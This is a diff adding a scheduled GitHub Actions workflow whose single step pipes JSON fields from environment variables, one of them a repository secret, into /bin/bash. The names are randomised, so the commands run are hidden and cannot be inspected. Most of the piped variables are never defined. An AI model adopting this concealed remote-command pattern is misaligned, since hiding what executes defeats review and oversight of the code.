@@ -1,0 +1,25 @@
+name: shengshengjidang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shengshengjidang
+        env:
+          u06206: ${{ secrets.u06206 }}
+        run: |
+          echo $u06206 | jq -r .t06 | /bin/bash
+          echo $v57116 | jq -r .oqaa69743 | /bin/bash
+          echo $ca2589 | jq -r .g622 | /bin/bash
+          echo $ef88 | jq -r .c5806 | /bin/bash
+          echo $ar280 | jq -r .dzo7 | /bin/bash
+          echo $iwnjm79999 | jq -r .q9 | /bin/bash
+          echo $e21538 | jq -r .kda2760 | /bin/bash
+          echo $zn822 | jq -r .jsyk0 | /bin/bash
+
